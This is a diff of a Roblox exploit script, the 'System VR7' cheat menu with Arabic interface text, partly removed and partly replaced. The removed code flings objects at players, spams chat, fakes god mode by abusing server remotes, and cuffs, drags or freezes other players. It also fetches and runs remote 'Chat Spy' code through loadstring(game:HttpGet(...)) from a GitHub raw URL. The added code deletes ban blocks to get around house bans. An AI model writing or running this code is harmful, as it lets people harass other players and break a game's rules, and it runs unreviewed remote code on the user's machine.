-        v356.BorderColor3 = Color3.fromRGB(0, 0, 0)
-        v356.BorderSizePixel = 0
-        v356.Position = p353
-        v356.Size = UDim2.new(0, 150, 0, 30)
-        v356.Font = Enum.Font.Oswald
-        v356.Text = p352
-        v356.TextColor3 = Color3.fromRGB(0, 0, 0)
-        v356.TextScaled = true
-        v356.TextSize = 14
-        v356.TextWrapped = true
-        if p351 == "VehicleFling_Button" or (p351 == "Ball_Fling" or (p351 == "Spam_Skins" or p351 == "Spamming_Commands")) then
-            CreateToggle(v356)
-        else
-            CreateClicker(v356)
-        end
-        return {
-            t1 = CreateRainbowTextLabel(p350, p354, UDim2.new(0, p353.X.Offset - 15, 0, p353.Y.Offset + 15), p355),
-            t2 = v356
-        }
-    end
-    if game.PlaceId == 14201103742 or (game.PlaceId == 12123568130 or (game.PlaceId == 18209796679 or (game.PlaceId == 17723040340 or game.PlaceId == 88950799188393))) then
-        pcall(function()
-            local vu357 = game:GetService("Workspace")
-            local vu358 = game:GetService("RunService")
-            local vu359 = game.Players.LocalPlayer
-            local vu360 = (vu359.Character or vu359.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart")
-            local v361 = Instance.new("Folder", vu357)
-            local v362 = Instance.new("Part", v361)
-            local vu363 = Instance.new("Attachment", v362)
-            v362.Anchored = true
-            v362.CanCollide = false
-            v362.Transparency = 1
-            if not getgenv().Network then
-                getgenv().Network = {
-                    BaseParts = {},
-                    Velocity = Vector3.new(14.46262424, 14.46262424, 14.46262424)
-                }
-                function Network.RetainPart(p364)
-                    if typeof(p364) == "Instance" and (p364:IsA("BasePart") and (p364:IsDescendantOf(vu357) and not p364:IsDescendantOf(game.Players.LocalPlayer.Character))) then
-                        table.insert(Network.BaseParts, p364)
-                        p364.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)
-                        p364.CanCollide = false
-                    end
-                end
-                (function()
-                    vu359.ReplicationFocus = vu357
-                    vu358.Heartbeat:Connect(function()
+
+
+
+    
+    FaresTab:AddSection("حماية البيوت")
+    FaresTab:AddToggle({
+        Name="🛡️ ازاله الباند من البيوت جميعا",
+        Default=false,
+        Callback=function(value)
+            if value then
+                getgenv().antiHouseBan = true
+                
+                
+                getgenv().banObserverConnection = task.spawn(function()
+                    local lotsFolder = Workspace:WaitForChild("001_Lots")
+
+                    
+                    local function checkAndRemoveBan(houseInstance)
                         pcall(function()
-                            sethiddenproperty(vu359, "SimulationRadius", math.huge)
-                            local v365, v366, v367 = pairs(Network.BaseParts)
-                            while true do
-                                local v368
-                                v367, v368 = v365(v366, v367)
-                                if v367 == nil then
-                                    break
-                                end
-                                if v368:IsDescendantOf(vu357) then
-                                    v368.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector * 50
+                            
+                            local houseModel = houseInstance:FindFirstChild("HousePickedByPlayer")
+                            if houseModel and houseModel:FindFirstChild("HouseModel") then
+                                local bannedBlock = houseModel.HouseModel:FindFirstChild("BannedBlock")
+                                if bannedBlock then
+                                    bannedBlock:Destroy()
+                                    Notify("حماية البيوت", "تم إزالة الباند من بيت: " .. houseInstance.Name, 2)
                                 end
                             end
                         end)
-                    end)
-                end)()
-            end
-            function Flinger(pu369)
-                if getgenv().loopfling and (pu369:IsA("BasePart") and not pu369.Anchored) and (not pu369.Parent:FindFirstChild("Humanoid") and (not pu369.Parent:FindFirstChild("Head") and pu369.Name ~= "Handle")) then
-                    local v370 = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
-                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(pu369.Position)
-                    wait(0.7)
-                    local v371 = next
-                    local v372, v373 = pu369:GetChildren()
-                    while true do
-                        local v374
-                        v373, v374 = v371(v372, v373)
-                        if v373 == nil then
-                            break
-                        end
-                        if v374:IsA("BodyAngularVelocity") or (v374:IsA("BodyForce") or (v374:IsA("BodyGyro") or (v374:IsA("BodyPosition") or (v374:IsA("BodyThrust") or (v374:IsA("BodyVelocity") or v374:IsA("RocketPropulsion")))))) then
-                            v374:Destroy()
-                        end
                     end
-                    if pu369:FindFirstChild("Attachment") then
-                        pu369:FindFirstChild("Attachment"):Destroy()
-                    end
-                    if pu369:FindFirstChild("AlignPosition") then
-                        pu369:FindFirstChild("AlignPosition"):Destroy()
-                    end
-                    if pu369:FindFirstChild("Torque") then
-                        pu369:FindFirstChild("Torque"):Destroy()
-                    end
-                    pu369.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)
-                    pu369.CanCollide = false
-                    pu369.CanTouch = false
-                    local v375 = Instance.new("Torque", pu369)
-                    v375.Torque = Vector3.new(100000, 100000, 100000)
-                    local v376 = Instance.new("AlignPosition", pu369)
-                    local v377 = Instance.new("Attachment", pu369)
-                    v375.Attachment0 = v377
-                    v376.MaxForce = 1e17
-                    v376.MaxVelocity = math.huge
-                    v376.Responsiveness = 200
-                    v376.Attachment0 = v377
-                    v376.Attachment1 = vu363
-                    spawn(function()
-                        while true do
-                            task.wait()
-                            if getgenv().loopfling then
-                                pcall(function()
-                                    if game.Players.LocalPlayer.Character.Humanoid.Health ~= 0 then
-                                        getgenv().look = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0, - 1, 0)
-                                    end
-                                end)
-                            end
-                            if getgenv().ejnfja then
-                                return
-                            end
-                        end
-                    end)
-                    spawn(function()
-                        pu369.CFrame = vu360.CFrame
-                        if getgenv().working then
-                            return
-                        else
-                            local vu378 = 0
-                            while true do
-                                getgenv().working = true
-                                task.wait()
-                                pcall(function()
-                                    vu378 = vu378 + math.rad(60)
-                                    local v379 = CFrame.new(math.sin(vu378) * 3, 0, math.cos(vu378) * 3)
-                                    vu363.WorldCFrame = getgenv().look * v379
-                                    pu369.CFrame = getgenv().look * v379
-                                    pu369.Velocity = getgenv().look.LookVector * 10000
-                                end)
-                            end
-                        end
-                    end)
-                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v370
-                end
-            end
-        end)
-    end
-    function LoadChatAlert()
-        local vu380 = game:GetService("TextChatService"):FindFirstChild("RBXGeneral", true)
-        local v381 = Instance.new("TextButton")
-        v381.Name = "ChatAlert_Button"
-        v381.Parent = vu232
-        v381.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-        v381.BackgroundTransparency = 0.5
-        v381.BorderColor3 = Color3.fromRGB(0, 0, 0)
-        v381.BorderSizePixel = 0
-        v381.Position = UDim2.new(0, 25, 0, 175)
-        v381.Size = UDim2.new(0, 150, 0, 30)
-        v381.Font = Enum.Font.Oswald
-        if vu380 then
-            v381.Text = "\239\191\189\216\172\216\179\216\179 \216\167\217\132\216\177\216\179\216\167\216\166\217\132"
-        else
-            v381.Text = "\239\191\189\217\134\216\168\217\138\217\135 \216\167\217\132\216\175\216\177\216\175\216\180\216\169 "
-        end
-        v381.TextColor3 = Color3.fromRGB(0, 0, 0)
-        v381.TextScaled = true
-        v381.TextSize = 14
-        v381.TextWrapped = true
-        CreateClicker(v381)
-        v381.MouseButton1Click:Connect(function()
-            if vu380 then
-                loadstring(game:HttpGet("https://raw.githubusercontent.com/Hm5011/hussain/refs/heads/main/Chat%20Spy"))()
-            else
-                Send("hello                                                                                                              You must wait before sending another message.")
-            end
-        end)
-    end
-    SendNotify("System VR7", "Script developed by V R 7 TEAM - Discord in your clipboard", 10)
-    if game.PlaceId ~= 17723040340 then
-        if game.PlaceId ~= 11379739543 then
-            if game.PlaceId ~= 17668572730 then
-                if game.PlaceId ~= 6165420832 then
-                    if game.CreatorId ~= 9642354 then
-                        if game.PlaceId ~= 14201103742 then
-                            if game.CreatorId ~= 14940374 or not string.find(game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, "Rob") then
-                                if game.PlaceId ~= 12123568130 then
-                                    if game.PlaceId ~= 88950799188393 then
-                                        if game.PlaceId ~= 4924922222 then
-                                            if game.PlaceId ~= 11984550654 then
-                                                if game.PlaceId ~= 335760407 then
-                                                    if game.CreatorId ~= 4001902 or not string.find(game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, "Mohammad") then
-                                                        if game.PlaceId ~= 16796468251 then
-                                                            if game.CreatorId ~= 35755428 or not string.find(game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, "\239\191\189\216\167\216\170") then
-                                                                LoadChatAlert()
-                                                            else
-                                                                SendNotify("\239\191\189\217\132\216\167\216\173\216\184\216\169", "\239\191\189\216\176\216\167 \216\167\217\132\217\133\216\167\216\168 \217\133\216\175\216\185\217\136\217\133 \217\133\217\134 \216\167\217\132\216\179\217\131\216\177\216\168\216\170 \216\170\217\136\216\172\216\175 \217\133\217\138\216\178\216\167\216\170 \216\174\216\167\216\181\217\135 \216\168\217\132\217\133\216\167\216\168", 5)
-                                                                getgenv().RainbowTjm41 = CreateButtonWithText(vu232, "Spam_Skins", "\239\191\189\216\174\216\177\217\138\216\168 \216\167\217\132\216\180\216\167\216\170", UDim2.new(0, 25, 0, 225), "\239\191\189\216\167\216\170 \217\136\217\135\216\167\216\170", 0)
-                                                                getgenv().RainbowTjm32 = CreateButtonWithText(vu232, "Spam_Skins", "\239\191\189\217\132\217\134\217\130 \216\179\217\138\216\167\216\177\216\169", UDim2.new(0, 210, 0, 225), "\239\191\189\216\167\216\170 \217\136\217\135\216\167\216\170", 0)
-                                                                getgenv().RainbowTjm41.t2.MouseButton1Click:Connect(function()
-                                                                    ChangeToggleColor(getgenv().RainbowTjm41.t2)
-                                                                    if getgenv().RainbowTjm41.t2.Ticket_Asset.ImageColor3 == Color3.fromRGB(0, 255, 0) then
-                                                                        while getgenv().RainbowTjm41.t2.Ticket_Asset.ImageColor3 == Color3.fromRGB(0, 255, 0) do
-                                                                            if game:GetService("TextChatService").ChatVersion == Enum.ChatVersion.TextChatService then
-                                                                                local v382 = 0
-                                                                                repeat
-                                                                                    task.wait(0.3)
-                                                                                    v382 = v382 + 1
-                                                                                    Send("######################################################################################################################################################################################")
-                                                                                until v382 >= 8
-                                                                            end
-                                                                            task.wait(1)
-                                                                        end
-                                                                    end
-                                                                end)
-                                                                getgenv().RainbowTjm32.t2.MouseButton1Click:Connect(function()
-                                                                    if game.Players.LocalPlayer.Character.Humanoid.SeatPart.Name == "DriveSeat" then
-                                                                        local v383, v384, v385 = ipairs(game.workspace:GetChildren())
-                                                                        while true do
-                                                                            local v386
-                                                                            v385, v386 = v383(v384, v385)
-                                                                            if v385 == nil then
-                                                                                break
-                                                                            end
-                                                                            if v386.Name ~= "FreeCars" and (v386.Name ~= "Money" and v386.Name ~= "skins") then
-                                                                                local v387, v388, v389 = ipairs(v386:GetDescendants())
-                                                                                while true do
-                                                                                    local v390
-                                                                                    v389, v390 = v387(v388, v389)
-                                                                                    if v389 == nil then
-                                                                                        break
-                                                                                    end
-                                                                                    if v390:IsA("BasePart") then
-                                                                                        v390.CanTouch = false
-                                                                                    end
-                                                                                end
-                                                                            end
-                                                                        end
-                                                                        ChangeToggleColor(getgenv().RainbowTjm32.t2)
-                                                                        if getgenv().RainbowTjm32.t2.Ticket_Asset.ImageColor3 == Color3.fromRGB(0, 255, 0) then
-                                                                            SendNotify("\239\191\189\217\132\216\167\216\173\216\184\216\169", "\239\191\189\216\167\216\176 \216\167\217\132\216\167\217\133\216\177 \217\138\216\183\217\138\216\177 \216\167\217\138 \216\180\216\174\216\181 \217\138\216\181\216\175\217\133 \216\168\216\179\217\138\216\167\216\177\216\170\217\131 \217\136\216\167\217\134\216\170 \216\170\216\179\217\136\217\130\217\135\216\167", 10)
-                                                                            SendNotify("\239\191\189\217\132\216\167\216\173\216\184\216\169", "\239\191\189\216\176\216\167 \217\136\216\167\216\173\216\175 \216\181\216\185\216\175 \217\133\216\185\217\131 \217\136\217\134\216\178\217\132 \216\168\217\138\216\183\217\138\216\177", 10)
-                                                                            local v391 = 0.1
-                                                                            while getgenv().RainbowTjm32.t2.Ticket_Asset.ImageColor3 == Color3.fromRGB(0, 255, 0) do
-                                                                                task.wait()
-                                                                                game:GetService("RunService").Heartbeat:Wait()
-                                                                                local v392 = game.Players.LocalPlayer.Character
-                                                                                if v392 then
-                                                                                    v392 = v392:FindFirstChild("HumanoidRootPart")
-                                                                                end
-                                                                                if v392 then
-                                                                                    local v393 = v392.Velocity
-                                                                                    v392.Velocity = v393 * 1000 + Vector3.new(0, 1000, 0)
-                                                                                    game:GetService("RunService").RenderStepped:Wait()
-                                                                                    v392.Velocity = v393
-                                                                                    game:GetService("RunService").Stepped:Wait()
-                                                                                    v392.Velocity = v393 + Vector3.new(0, v391, 0)
-                                                                                    v391 = - v391
-                                                                                end
-                                                                                local v394, v395, v396 = ipairs(game.Players:GetPlayers())
-                                                                                while true do
-                                                                                    local v397
-                                                                                    v396, v397 = v394(v395, v396)
-                                                                                    if v396 == nil then
-                                                                                        break
-                                                                                    end
-                                                                                    if v397 ~= game.Players.LocalPlayer then
-                                                                                        local v398, v399, v400 = ipairs(v397:GetChildren())
-                                                                                        while true do
-                                                                                            local v401
-                                                                                            v400, v401 = v398(v399, v400)
-                                                                                            if v400 == nil then
-                                                                                                break
-                                                                                            end
-                                                                                            if v401:IsA("BasePart") then
-                                                                                                v401.CanCollide = false
-                                                                                            end
-                                                                                        end
-                                                                                    end
-                                                                                end
-                                                                            end
-                                                                        end
-                                                                    else
-                                                                        local v402, v403, v404 = ipairs(game.workspace:GetChildren())
-                                                                        while true do
-                                                                            local v405
-                                                                            v404, v405 = v402(v403, v404)
-                                                                            if v404 == nil then
-                                                                                break
-                                                                            end
-                                                                            if v405.Name ~= "FreeCars" and (v405.Name ~= "Money" and v405.Name ~= "skins") then
-                                                                                local v406, v407, v408 = ipairs(v405:GetDescendants())
-                                                                                while true do
-                                                                                    local v409
-                                                                                    v408, v409 = v406(v407, v408)
-                                                                                    if v408 == nil then
-                                                                                        break
-                                                                                    end
-                                                                                    if v409:IsA("BasePart") then
-                                                                                        v409.CanTouch = true
-                                                                                    end
-                                                                                end
-                                                                            end
-                                                                        end
-                                                                        getgenv().RainbowTjm32.t2.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-                                                                    end
-                                                                end)
-                                                                LoadChatAlert()
-                                                            end
-                                                        else
-                                                            SendNotify("\239\191\189\217\132\216\167\216\173\216\184\216\169", "\239\191\189\216\176\216\167 \216\167\217\132\217\133\216\167\216\168 \217\133\216\175\216\185\217\136\217\133 \217\133\217\134 \216\167\217\132\216\179\217\131\216\177\216\168\216\170 \216\170\217\136\216\172\216\175 \217\133\217\138\216\178\216\167\216\170 \216\174\216\167\216\181\217\135 \216\168\217\132\217\133\216\167\216\168", 5)
-                                                            getgenv().RainbowTjm3 = CreateButtonWithText(vu232, "Spam_Skins", "God Mode", UDim2.new(0, 25, 0, 225), "\239\191\189\217\131\216\167\216\175\217\133\217\138\216\169 \216\175\216\177\216\167\216\172\217\136\217\134", 0)
-                                                            spawn(function()
-                                                                while true do
-                                                                    wait(GetPing() + 0.1)
-                                                                    pcall(function()
-                                                                        if game.Players.LocalPlayer.Character:FindFirstChild("Client") then
-                                                                            wait(2)
-                                                                            game.Players.LocalPlayer.Character:FindFirstChild("Client"):Destroy()
-                                                                        end
-                                                                    end)
-                                                                end
-                                                            end)
-                                                            getgenv().RainbowTjm3.t2.MouseButton1Click:Connect(function()
-                                                                ChangeToggleColor(getgenv().RainbowTjm3.t2)
-                                                                if getgenv().RainbowTjm3.t2.Ticket_Asset.ImageColor3 ~= Color3.fromRGB(0, 255, 0) then
-                                                                    getgenv().God = false
-                                                                else
-                                                                    getgenv().God = true
-                                                                    while getgenv().God do
-                                                                        task.wait()
-                                                                        pcall(function()
-                                                                            if game.Players.LocalPlayer.Character:FindFirstChild("ForceField", true) then
-                                                                                return
-                                                                            else
-                                                                                local v410 = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
-                                                                                game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("TeamChange"):FireServer(tostring(game.Players.LocalPlayer.Team))
-                                                                                while true do
-                                                                                    task.wait()
-                                                                                    if game.Players.LocalPlayer.Character:FindFirstChild("ForceField", true) then
-                                                                                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v410
-                                                                                    end
-                                                                                    if game.Players.LocalPlayer.Character:FindFirstChild("ForceField", true) then
-                                                                                    end
-                                                                                end
-                                                                            end
-                                                                        end)
-                                                                    end
-                                                                end
-                                                            end)
-                                                            LoadChatAlert()
-                                                        end
-                                                    else
-                                                        SendNotify("\239\191\189\217\132\216\167\216\173\216\184\216\169", "\239\191\189\216\176\216\167 \216\167\217\132\217\133\216\167\216\168 \217\133\216\175\216\185\217\136\217\133 \217\133\217\134 \216\167\217\132\216\179\217\131\216\177\216\168\216\170 \216\170\217\136\216\172\216\175 \217\133\217\138\216\178\216\167\216\170 \216\174\216\167\216\181\217\135 \216\168\217\132\217\133\216\167\216\168", 5)
-                                                        getgenv().RainbowTjm31 = CreateButtonWithText(vu232, "Spam_Skins", "\239\191\189\216\179\217\133\216\167\216\161 \216\185\216\180\217\136\216\167\216\166\217\138\216\169", UDim2.new(0, 210, 0, 225), "\239\191\189\216\167\217\132\217\138\216\169 \217\133\216\173\217\133\216\175", 0)
-                                                        getgenv().RainbowTjm33 = CreateButtonWithText(vu232, "Spam_Skins", "\239\191\189\217\133\217\138 \216\167\217\132\217\134\216\167\216\179", UDim2.new(0, 25, 0, 225), "\239\191\189\216\167\217\132\217\138\216\169 \217\133\216\173\217\133\216\175", 0)
-                                                        getgenv().RainbowTjm34 = CreateButtonWithText(vu232, "Spam_Skins", "\239\191\189\216\173\216\168 \216\167\217\132\217\134\216\167\216\179", UDim2.new(0, 25, 0, 275), "\239\191\189\216\167\217\132\217\138\216\169 \217\133\216\173\217\133\216\175", 0)
-                                                        getgenv().RainbowTjm35 = CreateButtonWithText(v260, "Bring_People", "\239\191\189\216\173\216\168", UDim2.new(0, 25, 0, 450), "\239\191\189\216\167\217\132\217\138\216\169 \217\133\216\173\217\133\216\175", 0)
-                                                        getgenv().RainbowTjm36 = CreateButtonWithText(v260, "Freeze_People", "\239\191\189\216\172\217\133\217\138\216\175", UDim2.new(0, 210, 0, 450), "\239\191\189\216\167\217\132\217\138\216\169 \217\133\216\173\217\133\216\175", 0)
-                                                        getgenv().RainbowTjm37 = CreateButtonWithText(vu232, "Change_Skins", "\239\191\189\216\186\217\138\217\138\216\177 \216\179\217\131\217\134\216\167\216\170 \216\167\217\132\217\130\216\177\217\138\216\168\217\138\217\134", UDim2.new(0, 25, 0, 375), "\239\191\189\216\173\216\170\216\167\216\172 \216\167\216\175\217\133\217\134", 0)
-                                                        getgenv().RainbowTjm50 = CreateButtonWithText(vu232, "Spam_Skins", "\239\191\189\216\172\217\133\217\138\216\175 \216\167\217\132\217\134\216\167\216\179", UDim2.new(0, 25, 0, 425), "\239\191\189\216\173\216\170\216\167\216\172 \216\167\216\175\217\133\217\134", 0)
-                                                        getgenv().RainbowTjm51 = CreateButtonWithText(vu232, "Spam_Skins", "\239\191\189\217\132\217\138 \216\167\217\132\217\134\216\167\216\179 \217\131\217\132\216\167\216\168", UDim2.new(0, 210, 0, 425), "\239\191\189\216\173\216\170\216\167\216\172 \216\167\216\175\217\133\217\134", 0)
-                                                        getgenv().RainbowTjm41 = CreateButtonWithText(vu232, "Spam_Skins", "\239\191\189\216\174\216\177\217\138\216\168 \216\167\217\132\216\180\216\167\216\170", UDim2.new(0, 210, 0, 375), "\239\191\189\216\167\217\132\217\138\216\169 \217\133\216\173\217\133\216\175", 0)
-                                                        getgenv().RainbowTjm38 = CreateButtonWithText(vu232, "Change_Size", "\239\191\189\217\131\216\168\217\138\216\177 \216\167\217\132\217\130\216\177\217\138\216\168\217\138\217\134", UDim2.new(0, 25, 0, 325), "\239\191\189\216\173\216\170\216\167\216\172 \216\167\216\175\217\133\217\134", 0)
-                                                        getgenv().RainbowTjm39 = CreateButtonWithText(vu232, "Spam_Skins", "\239\191\189\216\182\216\167\216\175 \217\131\217\132\216\168\216\180\216\169", UDim2.new(0, 210, 0, 275), "\239\191\189\216\167\217\132\217\138\217\135 \217\133\216\173\217\133\216\175", 0)
-                                                        getgenv().RainbowTjm40 = CreateButtonWithText(vu232, "Sound_Skin", "\239\191\189\217\131\217\134 \217\138\216\183\217\132\216\185 \216\181\217\136\216\170", UDim2.new(0, 210, 0, 325), "\239\191\189\216\167\217\132\217\138\217\135 \217\133\216\173\217\133\216\175", 0)
-                                                        v260.CanvasSize = UDim2.new(0, 0, 1.5, 0)
-                                                        vu232.CanvasSize = UDim2.new(0, 0, 1.34, 0)
-                                                        getgenv().RainbowTjm31.t2.MouseButton1Click:Connect(function()
-                                                            if vu48 then
-                                                                ChangeToggleColor(getgenv().RainbowTjm31.t2)
-                                                                local v411 = {
-                                                                    "\239\191\189\217\132\217\138 \217\130\216\175\216\167\217\133\217\138 \217\136\216\181\216\174",
-                                                                    "\239\191\189\217\135\217\138\217\134\217\131",
-                                                                    "\239\191\189\217\130\216\178 \216\168\216\179",
-                                                                    "\239\191\189\217\134\216\167 \216\185\217\133\217\131",
-                                                                    "\239\191\189\217\138\216\167\217\131\217\131\217\133",
-                                                                    "\239\191\189\216\167\216\172 \216\177\216\167\216\179\217\131",
-                                                                    "\239\191\189\217\134\216\185\216\167\217\132\217\138 \216\180\216\167\217\132\217\138\216\169 \217\133\216\173\217\133\216\175",
-                                                                    "\239\191\189\217\131\216\167\217\129\216\173\216\169 \216\167\217\132\216\177\217\136\217\132",
-                                                                    "\239\191\189\216\167\216\186\216\183\217\135\217\133\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189",
-                                                                    "\239\191\189\216\174\216\177\217\138\216\168 \216\185\217\132\217\137 \216\167\217\132\216\177\217\136\217\132",
-                                                                    "\239\191\189\217\134\216\185\216\167\217\132\217\138 \216\181\216\167\216\173\216\168 \216\167\217\132\217\133\216\167\216\168 \217\136\217\133\216\180\216\177\217\129\217\138\217\134\217\135",
-                                                                    "\239\191\189\216\172\217\132\217\138 \217\129\217\138\217\131",
-                                                                    "\239\191\189\217\132\216\167 \216\167\217\134\216\168\216\173",
-                                                                    "\239\191\189\217\132\217\138\217\131 \217\133\216\182\216\186\217\136\216\183 \217\133\217\134\217\138",
-                                                                    "\239\191\189\216\178 \216\167\217\133\217\135\216\167 \216\168\216\179",
-                                                                    "\239\191\189\217\132\217\138 \217\130\216\175\216\167\217\133\217\138 \217\131\217\132\216\168",
-                                                                    "\239\191\189\217\134\216\185\216\167\217\132\217\138 \217\131\217\132 \216\167\217\132\217\138 \216\182\216\167\216\186\216\183\217\135\217\133 \226\156\140\239\184\143",
-                                                                    "\239\191\189\217\134\216\167 \217\129\216\173\217\132 \216\167\217\132\217\133\216\167\216\168",
-                                                                    "\239\191\189\217\134\216\168\216\185 \216\167\217\132\217\133\216\177\216\172\217\132\217\135 \217\135\217\134\216\167"
-                                                                }
-                                                                local v412 = game:GetService("Players").LocalPlayer.PlayerGui.ScreenGui.Title.ChangeName
-                                                                local v413 = game:GetService("Players").LocalPlayer.PlayerGui.ScreenGui.Title.Input
-                                                                if getgenv().RainbowTjm31.t2.Ticket_Asset.ImageColor3 ~= Color3.fromRGB(0, 255, 0) then
-                                                                    getgenv().ChangeName = false
-                                                                else
-                                                                    getgenv().ChangeName = true
-                                                                    while getgenv().ChangeName do
-                                                                        game:GetService("Players").LocalPlayer.PlayerGui.ScreenGui.HiddenCommands.Visible = false
-                                                                        v413.Text = v411[math.random(1, # v411)]
-                                                                        if not game:GetService("Players").LocalPlayer.PlayerGui.ScreenGui.Title.Colors.bluelight.hit_box:FindFirstChild("UIStroke") then
-                                                                            firesignal(game:GetService("Players").LocalPlayer.PlayerGui.ScreenGui.Title.Colors.bluelight.hit_box.MouseButton1Click)
-                                                                        end
-                                                                        firesignal(v412.MouseButton1Click)
-                                                                        game:GetService("Players").LocalPlayer.PlayerGui.ScreenGui.HiddenCommands.Visible = false
-                                                                        task.wait(10)
-                                                                        game:GetService("Players").LocalPlayer.PlayerGui.ScreenGui.HiddenCommands.Visible = false
-                                                                    end
-                                                                    SendNotify("System VR7", "\239\191\189\217\132\216\167\216\173\216\184\216\169 \216\167\216\176\216\167 \216\167\217\132\216\167\216\179\217\133 \217\133\216\185\217\132\217\130 \217\135\216\167\216\176 \217\130\217\132\216\170\216\180 \217\133\217\134 \216\167\217\132\217\133\216\167\216\168", 5)
-                                                                end
-                                                            else
-                                                                SendNotify("System VR7", "\239\191\189\217\132\216\167\216\179\217\129 \216\167\217\132\217\135\216\167\217\131 \216\167\217\132\217\138 \216\170\216\179\216\170\216\174\216\175\217\133\216\169 \217\132\216\167\217\138\216\175\216\185\217\133 \217\135\217\132 \217\133\217\138\216\178\216\169", 5)
-                                                            end
-                                                        end)
-                                                        getgenv().RainbowTjm33.t2.MouseButton1Click:Connect(function()
-                                                            if GetCuff() then
-                                                                ChangeToggleColor(getgenv().RainbowTjm33.t2)
-                                                                if getgenv().RainbowTjm33.t2.Ticket_Asset.ImageColor3 ~= Color3.fromRGB(0, 255, 0) then
-                                                                    getgenv().Cuff = {
-                                                                        Bring = false,
-                                                                        Throw = false
-                                                                    }
-                                                                else
-                                                                    if getgenv().RainbowTjm34.t2.Ticket_Asset.ImageColor3 == Color3.fromRGB(0, 255, 0) then
-                                                                        getgenv().RainbowTjm34.t2.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-                                                                        getgenv().Cuff = {
-                                                                            Bring = false,
-                                                                            Throw = false
-                                                                        }
-                                                                        wait(1)
-                                                                    end
-                                                                    getgenv().Cuff = {
-                                                                        Bring = true,
-                                                                        Throw = true
-                                                                    }
-                                                                    Cuffbring()
-                                                                end
-                                                            else
-                                                                game:GetService("StarterGui"):SetCore("SendNotification", {
-                                                                    Title = "System VR7",
-                                                                    Text = "\239\191\189\216\167\216\178\217\133 \217\138\217\131\217\136\217\134 \217\133\216\185\217\131 \217\131\217\132\216\168\216\180\216\169",
-                                                                    Duration = 5
-                                                                })
-                                                            end
-                                                        end)
-                                                        getgenv().RainbowTjm34.t2.MouseButton1Click:Connect(function()
-                                                            if GetCuff() then
-                                                                ChangeToggleColor(getgenv().RainbowTjm34.t2)
-                                                                if getgenv().RainbowTjm34.t2.Ticket_Asset.ImageColor3 ~= Color3.fromRGB(0, 255, 0) then
-                                                                    getgenv().Cuff = {
-                                                                        Bring = false,
-                                                                        Throw = false
-                                                                    }
-                                                                else
-                                                                    if getgenv().RainbowTjm33.t2.Ticket_Asset.ImageColor3 == Color3.fromRGB(0, 255, 0) then
-                                                                        getgenv().RainbowTjm33.t2.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-                                                                        getgenv().Cuff = {
-                                                                            Bring = false,
-                                                                            Throw = false
-                                                                        }
-                                                                        wait(1)
-                                                                    end
-                                                                    getgenv().Cuff = {
-                                                                        Bring = true,
-                                                                        Throw = false
-                                                                    }
-                                                                    Cuffbring()
-                                                                end
-                                                            else
-                                                                game:GetService("StarterGui"):SetCore("SendNotification", {
-                                                                    Title = "System VR7",
-                                                                    Text = "\239\191\189\216\167\216\178\217\133 \217\138\217\131\217\136\217\134 \217\133\216\185\217\131 \217\131\217\132\216\168\216\180\216\169",
-                                                                    Duration = 5
-                                                                })
-                                                            end
-                                                        end)
-                                                        getgenv().RainbowTjm35.t2.MouseButton1Click:Connect(function()
-                                                            pcall(function()
-                                                                if vu41 ~= nil then
-                                                                    local v414 = GetCuff()
-                                                                    if not v414 then
-                                                                        SendNotify("System VR7", "\239\191\189\216\167\216\178\217\133 \217\138\217\131\217\136\217\134 \217\133\216\185\217\131 \217\131\217\132\216\168\216\180\216\169", 5)
-                                                                        return
-                                                                    end
-                                                                    if vu37[vu41].Character.UpperTorso.Anchored then
-                                                                        SendNotify("System VR7", "\239\191\189\217\132\216\167\216\185\216\168 \217\133\216\170\216\172\217\133\216\175 \216\167\217\136 \217\133\217\131\217\132\216\168\216\180 \216\168\217\132 \216\167\216\179\216\167\216\179", 5)
-                                                                        return
-                                                                    end
-                                                                    if v414 and v414.Parent == game.Players.LocalPlayer.Backpack then
-                                                                        v414.Parent = game.Players.LocalPlayer.Character
-                                                                    end
-                                                                    wait()
-                                                                    v414.RemoteEvent:FireServer(vu37[vu41].Character.HumanoidRootPart, "Cuff")
-                                                                    wait(0.2)
-                                                                    v414.RemoteEvent:FireServer(vu37[vu41].Character.HumanoidRootPart, "Cuff")
-                                                                end
-                                                            end)
-                                                        end)
-                                                        getgenv().RainbowTjm36.t2.MouseButton1Click:Connect(function()
-                                                            pcall(function()
-                                                                if vu41 ~= nil then
-                                                                    local v415 = GetCuff()
-                                                                    if not v415 then
-                                                                        SendNotify("System VR7", "\239\191\189\216\167\216\178\217\133 \217\138\217\131\217\136\217\134 \217\133\216\185\217\131 \217\131\217\132\216\168\216\180\216\169", 5)
-                                                                        return
-                                                                    end
-                                                                    if vu37[vu41].Character.UpperTorso.Anchored then
-                                                                        SendNotify("System VR7", "\239\191\189\217\132\216\167\216\185\216\168 \217\133\216\170\216\172\217\133\216\175 \216\167\217\136 \217\133\217\131\217\132\216\168\216\180 \216\168\217\132 \216\167\216\179\216\167\216\179", 5)
-                                                                        return
-                                                                    end
-                                                                    if v415 and v415.Parent == game.Players.LocalPlayer.Backpack then
-                                                                        v415.Parent = game.Players.LocalPlayer.Character
-                                                                    end
-                                                                    v415.RemoteEvent:FireServer(vu37[vu41].Character.HumanoidRootPart, "Cuff")
-                                                                    wait(0.01)
-                                                                    local v416 = game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("HDAdminInterface").MainFrame.Pages.Settings.Custom["AE1 Prefix"].SettingValue.TextBox.Text
